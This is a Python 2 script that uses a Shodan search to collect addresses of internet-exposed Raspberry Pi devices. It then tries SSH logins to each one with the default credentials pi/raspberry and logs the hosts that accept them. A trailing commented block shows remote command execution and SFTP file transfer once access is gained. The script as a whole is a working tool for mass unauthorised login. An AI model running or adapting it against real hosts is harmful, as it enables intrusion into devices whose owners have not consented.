import argparse
import os
import socket
import sys

import paramiko

parser = argparse.ArgumentParser()
parser.add_argument('-i','--input', help='Input file', type=str, default='raspberry_ip.txt')
args = parser.parse_args()
target_file = str(args.input).replace(' ','')

if target_file == 'raspberry_ip.txt':
    print '\n\n'+'  Source File: %s (Default)'%target_file
else:
    print '\n\n'+'  Source File: %s (input)'%target_file

def file_check():
    '''Check if target list is available or not.'''

    if os.path.isfile('./'+target_file) is False or os.path.getsize(target_file) == 0:
        print "  File not found\n  Creating file using Shodan..."
        import shodan
        #Define Shodan Api key--
        shodan_api = ''
        api = shodan.Shodan(shodan_api)
        try:
            results = api.search('raspberry')
            with open(target_file, 'a') as ras:
                for addr in results['matches']:
                    ras.write(addr['ip_str']+'\n')
                ras.close()
            print '  File \"%s\" created!'%target_file
        except shodan.APIError, e:
            print '  Error: %s\n  Check the shodan api key!'%e
            sys.exit()
        except:
            raise

def connect(server, username, password):
    try:
        #Connection initiated... set the value for timeout.
        ssh.connect(server, username=username, password=password, timeout=8)
        with open('success_ip.txt', 'a+') as fl:
            fl.write(server+'\n')
            fl.close()
        ssh.close()
        return 'success'
    except paramiko.AuthenticationException:
        return 'auth_fail'
    except paramiko.ssh_exception.NoValidConnectionsError:
        return 'conn_fail'
    except socket.error:
        return 'conn_timeout'
    except paramiko.ssh_exception.SSHException:
        return 'conn_fail'
    except KeyboardInterrupt:
        return 'interrupt'
    except:
        raise

def main():
    """INITIALIZE:"""

    file_check()
    global ssh
    ssh = paramiko.SSHClient()
    log_filename = 'paramiko_log.txt'
    #ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
    '''
    In case the server's key is unknown,
    we will be rejecting it automatically.
    '''
    paramiko.util.log_to_file(log_filename)
    log_filename = 'paramiko_log.txt'
    success = 0
    counter = 0
    print '\n'+'  {:-^46}'.format('Start')+'\n'
    #Main loop:
    while True:
        f = open(target_file, 'r')
        lines = f.readlines()
        try:
            server = lines[counter]
            server = server.strip()
            username = 'pi'
            password = 'raspberry'
            response = connect(server, username, password)
            if response == 'auth_fail':
                counter = counter + 1
                print '%3d : %7s : %5s'%(counter, server, 'Authentication Failed!')
            elif response == 'conn_fail':
                counter = counter + 1
                print '%3d : %7s : %5s'%(counter, server, 'Connection Failed!')
            elif response == 'conn_timeout':
                counter = counter + 1
                print '%3d : %7s : %5s'%(counter, server, 'Connection Timeout!')
            elif response == 'success':
                counter = counter + 1
                success = success + 1
                print '%3d : %7s : %5s'%(counter, server, 'Success!')
            elif response == 'interrupt':
                raise KeyboardInterrupt

        except KeyboardInterrupt:
            print '\n\n  {:-^46}'.format('Interrupted!')+'\n'
            sys.exit()
        except IndexError:
            f.close()
            print "\n  Total successful IPs -- %d"%success
            print '  {:-^46}'.format('Finished')+'\n'
            sys.exit()
        except:
            f.close()
            raise



if __name__ == "__main__":
    main()




'''
Debugging:

    #Error handling---
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('ls /tmp')
    #Reading output of the executed command
    print "output", ssh_stdout.read()                
    error = ssh_stderr.read()
    #Reading the error stream of the executed command
    print "error:", error, len(error)
    #Transfering files to and from the remote machine
    sftp = ssh.open_sftp()
    sftp.get(remote_path, local_path)
    sftp.put(local_path, remote_path)
    sftp.close()
    ssh.close()

'''
